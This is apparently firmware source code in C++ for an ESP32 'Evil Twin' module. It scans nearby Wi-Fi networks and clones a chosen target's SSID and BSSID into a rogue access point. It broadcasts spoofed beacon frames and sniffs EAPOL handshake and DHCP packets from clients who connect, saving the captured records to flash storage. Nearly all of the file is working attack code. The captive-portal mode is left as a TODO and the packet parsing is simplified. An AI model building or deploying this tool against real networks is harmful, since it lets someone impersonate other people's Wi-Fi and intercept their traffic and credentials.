#include "EvilTwinModule.h"
#include <string.h>
#include <stdio.h>

EvilTwinModule* EvilTwinModule::_instance = nullptr;

// ─────────────────────────────────────────
//  Constructor & Lifecycle
// ─────────────────────────────────────────
EvilTwinModule::EvilTwinModule(Display& display)
    : _display(display) {
    _instance = this;
    memset(&_selected_target, 0, sizeof(_selected_target));
    memset(_scan_results, 0, sizeof(_scan_results));
    memset(_captured_credentials, 0, sizeof(_captured_credentials));
    memset(_fake_client_macs, 0, sizeof(_fake_client_macs));
}

EvilTwinModule::~EvilTwinModule() {
    stop();
}

void EvilTwinModule::begin() {
    Serial.println("[EvilTwin] Initializing...");
    _state = EvilTwinState::IDLE;
    _state_start_ms = millis();
    
    // Initialize NVS
    nvs_flash_init();
    
    // Initialize Wi-Fi in STA mode initially (will switch to AP)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // Load any previously captured credentials
    loadCredentials();
    
    Serial.println("[EvilTwin] Ready");
}

void EvilTwinModule::tick() {
    if (_state == EvilTwinState::IDLE) {
        return;
    }

    uint32_t elapsed = millis() - _state_start_ms;

    // ── Non-blocking state machine ───────────────
    switch (_state) {
        case EvilTwinState::SCANNING:
            // Scanning is handled by startScan() and WiFi.scanNetworks()
            // This tick just monitors completion
            break;

        case EvilTwinState::CLONING:
            // Transition to broadcasting after brief delay
            if (elapsed > 200) {
                _state = EvilTwinState::BROADCASTING;
                _state_start_ms = millis();
                Serial.println("[EvilTwin] Switched to BROADCASTING");
            }
            break;

        case EvilTwinState::BROADCASTING:
            // Send beacon frames at regular intervals
            _broadcastFakeBeacon();

            // Optional SSID rotation every 3 seconds
            if (_rotate_ssid && elapsed > 3000) {
                _ssid_rotation_idx = (_ssid_rotation_idx + 1) % EVIL_TWIN_MAX_TARGETS;
                _state_start_ms = millis();
            }
            break;

        case EvilTwinState::CAPTURING:
            // Listen for client connections in promiscuous mode
            // Handled by promiscuous callback
            if (elapsed > 30000) {
                // Auto-timeout after 30 seconds
                Serial.println("[EvilTwin] Capture timeout");
                _state = EvilTwinState::COMPLETE;
            }
            break;

        case EvilTwinState::CREDENTIAL_SNIFF:
            // Passively sniff EAPOL/DHCP packets
            if (elapsed > 60000) {
                // Auto-stop after 60 seconds
                _state = EvilTwinState::COMPLETE;
                Serial.printf("[EvilTwin] Sniff complete: %lu packets captured\n", _packets_captured);
            }
            break;

        case EvilTwinState::COMPLETE:
            // Hold state briefly then return to idle
            if (elapsed > 500) {
                _state = EvilTwinState::IDLE;
            }
            break;

        default:
            break;
    }
}

// ─────────────────────────────────────────
//  Scanning
// ─────────────────────────────────────────
void EvilTwinModule::startScan() {
    Serial.println("[EvilTwin] Starting AP scan...");
    _state = EvilTwinState::SCANNING;
    _state_start_ms = millis();
    _scan_count = 0;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Scan for networks
    int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
    _scan_count = (n > EVIL_TWIN_MAX_TARGETS) ? EVIL_TWIN_MAX_TARGETS : n;

    for (int i = 0; i < _scan_count; i++) {
        strncpy(_scan_results[i].ssid, WiFi.SSID(i).c_str(), 32);
        _scan_results[i].ssid[32] = '\0';
        
        memcpy(_scan_results[i].bssid, WiFi.BSSID(i), 6);
        _scan_results[i].rssi = WiFi.RSSI(i);
        _scan_results[i].channel = WiFi.channel(i);
        _scan_results[i].encryption = WiFi.encryptionType(i);
        _scan_results[i].hidden = (WiFi.SSID(i).length() == 0);
        _scan_results[i].is_active = false;

        Serial.printf("[EvilTwin] AP %d: %s | RSSI: %d | Ch: %d\n",
            i, _scan_results[i].ssid, _scan_results[i].rssi, _scan_results[i].channel);
    }

    _state = EvilTwinState::IDLE;
    Serial.printf("[EvilTwin] Scan complete: %d APs found\n", _scan_count);
}

void EvilTwinModule::stopScan() {
    WiFi.scanDelete();
    _state = EvilTwinState::IDLE;
}

void EvilTwinModule::selectTarget(int8_t index) {
    if (index < 0 || index >= _scan_count) {
        Serial.println("[EvilTwin] Invalid target index");
        return;
    }

    _selected_target = _scan_results[index];
    Serial.printf("[EvilTwin] Target selected: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
        _selected_target.ssid,
        _selected_target.bssid[0], _selected_target.bssid[1], _selected_target.bssid[2],
        _selected_target.bssid[3], _selected_target.bssid[4], _selected_target.bssid[5]);
}

// ─────────────────────────────────────────
//  Evil Twin AP Creation
// ─────────────────────────────────────────
void EvilTwinModule::startEvilTwin(EvilTwinMode mode) {
    if (_selected_target.ssid[0] == '\0') {
        Serial.println("[EvilTwin] No target selected");
        return;
    }

    _mode = mode;
    _state = EvilTwinState::CLONING;
    _state_start_ms = millis();
    _ap_running = true;
    _connected_clients = 0;
    _current_channel = _selected_target.channel;

    Serial.printf("[EvilTwin] Starting Evil Twin: %s | Mode: %d\n",
        _selected_target.ssid, static_cast<int>(mode));

    // Switch to AP mode
    WiFi.mode(WIFI_AP);
    
    // Configure soft AP with cloned SSID
    WiFi.softAPConfig(
        IPAddress(192, 168, 4, 1),   // Local IP
        IPAddress(192, 168, 4, 1),   // Gateway
        IPAddress(255, 255, 255, 0)  // Subnet
    );

    // Start soft AP (no password for OPEN_NETWORK mode)
    if (_mode == EvilTwinMode::OPEN_NETWORK) {
        WiFi.softAP(_selected_target.ssid);
        Serial.println("[EvilTwin] AP running (OPEN)");
    } else if (_mode == EvilTwinMode::WPA2_MIMIC) {
        // Fake WPA2 (password doesn't matter, just frame structure)
        WiFi.softAP(_selected_target.ssid, "00000000");
        Serial.println("[EvilTwin] AP running (WPA2 MIMIC)");
    } else if (_mode == EvilTwinMode::CAPTIVE_PORTAL) {
        WiFi.softAP(_selected_target.ssid);
        // TODO: Implement DNS spoofing + captive portal
        Serial.println("[EvilTwin] AP running (CAPTIVE PORTAL)");
    }

    // Enable promiscuous mode for packet capture
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_promiscuousCallback);

    // Set channel
    esp_wifi_set_channel(_current_channel, WIFI_SECOND_CHAN_NONE);

    _state = EvilTwinState::CAPTURING;
    _state_start_ms = millis();
}

void EvilTwinModule::stopEvilTwin() {
    Serial.println("[EvilTwin] Stopping Evil Twin...");
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    
    _ap_running = false;
    _state = EvilTwinState::IDLE;
    _connected_clients = 0;

    // Save captured credentials
    saveCredentials();
    
    Serial.printf("[EvilTwin] Stopped. Credentials captured: %d\n", _captured_creds_count);
}

// ─────────────────────────────────────────
//  Beacon Broadcasting
// ─────────────────────────────────────────
void EvilTwinModule::_buildBeaconFrame(uint8_t* frame, size_t& frame_len,
                                       const char* ssid, uint8_t channel,
                                       uint8_t encryption_type) {
    // Simplified beacon frame (without full IE parsing)
    // In production, use FrameConstructionModule for full compliance
    
    memset(frame, 0, 256);
    size_t pos = 0;

    // Frame Control (beacon type)
    frame[pos++] = 0x80;  // Management frame
    frame[pos++] = 0x00;
    
    // Duration
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;

    // Destination (broadcast)
    memset(&frame[pos], 0xFF, 6);
    pos += 6;

    // Source (our fake AP BSSID)
    memcpy(&frame[pos], _selected_target.bssid, 6);
    pos += 6;

    // BSSID (same as source)
    memcpy(&frame[pos], _selected_target.bssid, 6);
    pos += 6;

    // Sequence number
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;

    // Beacon body: timestamp + interval + capability
    memset(&frame[pos], 0, 8);  // Timestamp
    pos += 8;

    frame[pos++] = 0x64;  // Beacon interval (100 TU)
    frame[pos++] = 0x00;

    frame[pos++] = 0x01;  // Capability info
    frame[pos++] = 0x04;

    // SSID IE
    frame[pos++] = 0x00;  // Element ID
    size_t ssid_len = strlen(ssid);
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates IE
    frame[pos++] = 0x01;
    frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12; frame[pos++] = 0x18; frame[pos++] = 0x24;

    // DS Parameter Set (channel)
    frame[pos++] = 0x03;
    frame[pos++] = 0x01;
    frame[pos++] = channel;

    frame_len = pos;
}

void EvilTwinModule::_broadcastFakeBeacon() {
    // Send beacon frame every EVIL_TWIN_BROADCAST_INTERVAL ms
    if (millis() - _last_beacon_ms < EVIL_TWIN_BROADCAST_INTERVAL) {
        return;
    }

    _last_beacon_ms = millis();

    uint8_t beacon_frame[256];
    size_t frame_len = 0;

    // Get SSID (rotate if enabled)
    const char* ssid = _selected_target.ssid;
    if (_rotate_ssid && _scan_count > 0) {
        ssid = _scan_results[_ssid_rotation_idx].ssid;
    }

    _buildBeaconFrame(beacon_frame, frame_len, ssid, _current_channel, 0);

    // Transmit raw frame
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, frame_len, false);
    
    _frames_sent++;
}

// ─────────────────────────────────────────
//  Client Connection Handling
// ─────────────────────────────────────────
void EvilTwinModule::_handleClientConnection(const uint8_t* client_mac) {
    if (_connected_clients >= EVIL_TWIN_MAX_CLIENTS) {
        return;
    }

    memcpy(_fake_client_macs[_connected_clients], client_mac, 6);
    _connected_clients++;
    _connection_attempts++;

    Serial.printf("[EvilTwin] Client connected: %02X:%02X:%02X:%02X:%02X:%02X (total: %d)\n",
        client_mac[0], client_mac[1], client_mac[2],
        client_mac[3], client_mac[4], client_mac[5],
        _connected_clients);
}

// ─────────────────────────────────────────
//  Packet Capture & Credential Sniffing
// ─────────────────────────────────────────
void EvilTwinModule::_capturePacket(const uint8_t* payload, size_t length) {
    if (_captured_creds_count >= EVIL_TWIN_MAX_CREDENTIALS) {
        return;
    }

    _packets_captured++;

    // Simple packet parsing for EAPOL (802.1X) and DHCP
    // Frame offset: 24 (MAC header) + variable
    
    if (length < 30) return;

    // Check for EAPOL (0x888E)
    if (_capture_eapol && length > 26) {
        uint16_t ether_type = (payload[24] << 8) | payload[25];
        
        if (ether_type == 0x888E) {
            // EAPOL packet detected
            CapturedCredential& cred = _captured_credentials[_captured_creds_count];
            memcpy(cred.client_mac, &payload[10], 6);
            strncpy(cred.ssid, _selected_target.ssid, 32);
            cred.timestamp = millis();
            cred.is_valid = true;
            
            // Copy EAPOL payload (simplified)
            snprintf(cred.username, sizeof(cred.username), "EAPOL:%02X:%02X",
                payload[26], payload[27]);
            
            _captured_creds_count++;
            
            Serial.printf("[EvilTwin] EAPOL captured from %02X:%02X:%02X:%02X:%02X:%02X\n",
                cred.client_mac[0], cred.client_mac[1], cred.client_mac[2],
                cred.client_mac[3], cred.client_mac[4], cred.client_mac[5]);
        }
    }

    // Check for DHCP (UDP port 67/68)
    if (_capture_dhcp && length > 50) {
        // Simplified DHCP detection (bytes 36-37 = UDP dest port)
        uint16_t dest_port = (payload[36] << 8) | payload[37];
        
        if (dest_port == 68 || dest_port == 67) {
            // DHCP packet detected
            // Extract hostname if available (byte 44+)
            if (length > 44) {
                CapturedCredential& cred = _captured_credentials[_captured_creds_count];
                memcpy(cred.client_mac, &payload[10], 6);
                strncpy(cred.ssid, _selected_target.ssid, 32);
                cred.timestamp = millis();
                cred.is_valid = true;
                
                snprintf(cred.username, sizeof(cred.username), "DHCP_CLIENT");
                _captured_creds_count++;
            }
        }
    }
}

void EvilTwinModule::_promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_instance || type != WIFI_PKT_DATA) {
        return;
    }

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    if (_instance->_capture_eapol || _instance->_capture_dhcp) {
        _instance->_capturePacket(pkt->payload, pkt->rx_ctrl.sig_len);
    }
}

// ─────────────────────────────────────────
//  NVS Persistence (No SD Card)
// ─────────────────────────────────────────
void EvilTwinModule::saveCredentials() {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &handle);
    
    if (err != ESP_OK) {
        Serial.printf("[EvilTwin] NVS open failed: %s\n", esp_err_to_name(err));
        return;
    }

    // Save credential count
    nvs_set_i32(handle, "cred_count", _captured_creds_count);

    // Save each credential
    for (int i = 0; i < _captured_creds_count; i++) {
        char key_ssid[32], key_mac[32], key_user[32], key_pass[32];
        
        snprintf(key_ssid, sizeof(key_ssid), "c%d_ssid", i);
        snprintf(key_mac, sizeof(key_mac), "c%d_mac", i);
        snprintf(key_user, sizeof(key_user), "c%d_user", i);
        snprintf(key_pass, sizeof(key_pass), "c%d_pass", i);

        nvs_set_str(handle, key_ssid, _captured_credentials[i].ssid);
        nvs_set_blob(handle, key_mac, _captured_credentials[i].client_mac, 6);
        nvs_set_str(handle, key_user, _captured_credentials[i].username);
        nvs_set_str(handle, key_pass, _captured_credentials[i].password);
    }

    nvs_commit(handle);
    nvs_close(handle);

    Serial.printf("[EvilTwin] %d credentials saved to NVS\n", _captured_creds_count);
}

void EvilTwinModule::loadCredentials() {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &handle);
    
    if (err != ESP_OK) {
        Serial.println("[EvilTwin] No stored credentials");
        return;
    }

    int32_t count = 0;
    nvs_get_i32(handle, "cred_count", &count);
    _captured_creds_count = (count > EVIL_TWIN_MAX_CREDENTIALS) ? EVIL_TWIN_MAX_CREDENTIALS : count;

    for (int i = 0; i < _captured_creds_count; i++) {
        char key_ssid[32], key_mac[32], key_user[32], key_pass[32];
        
        snprintf(key_ssid, sizeof(key_ssid), "c%d_ssid", i);
        snprintf(key_mac, sizeof(key_mac), "c%d_mac", i);
        snprintf(key_user, sizeof(key_user), "c%d_user", i);
        snprintf(key_pass, sizeof(key_pass), "c%d_pass", i);

        size_t mac_len = 6;
        nvs_get_str(handle, key_ssid, _captured_credentials[i].ssid, nullptr);
        nvs_get_blob(handle, key_mac, _captured_credentials[i].client_mac, &mac_len);
        nvs_get_str(handle, key_user, _captured_credentials[i].username, nullptr);
        nvs_get_str(handle, key_pass, _captured_credentials[i].password, nullptr);
    }

    nvs_close(handle);
    Serial.printf("[EvilTwin] Loaded %d credentials from NVS\n", _captured_creds_count);
}

void EvilTwinModule::clearStoredCredentials() {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &handle);
    
    if (err == ESP_OK) {
        nvs_erase_all(handle);
        nvs_commit(handle);
        nvs_close(handle);
    }

    _captured_creds_count = 0;
    memset(_captured_credentials, 0, sizeof(_captured_credentials));
    
    Serial.println("[EvilTwin] Credentials cleared");
}

// ─────────────────────────────────────────
//  Configuration
// ─────────────────────────────────────────
void EvilTwinModule::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 13) return;
    
    _current_channel = channel;
    if (_ap_running) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
}

void EvilTwinModule::setCaptureFilter(bool capture_eapol, bool capture_dhcp) {
    _capture_eapol = capture_eapol;
    _capture_dhcp = capture_dhcp;
}

// ─────────────────────────────────────────
//  State & Diagnostics
// ─────────────────────────────────────────
const char* EvilTwinModule::getStateString() const {
    switch (_state) {
        case EvilTwinState::IDLE:                return "IDLE";
        case EvilTwinState::SCANNING:            return "SCAN";
        case EvilTwinState::CLONING:             return "CLONE";
        case EvilTwinState::BROADCASTING:        return "BROADCAST";
        case EvilTwinState::CAPTURING:           return "CAPTURE";
        case EvilTwinState::CREDENTIAL_SNIFF:    return "SNIFF";
        case EvilTwinState::COMPLETE:            return "COMPLETE";
        default:                                 return "UNKNOWN";
    }
}

void EvilTwinModule::stop() {
    stopEvilTwin();
    _state = EvilTwinState::IDLE;
    Serial.println("[EvilTwin] Stopped");
}
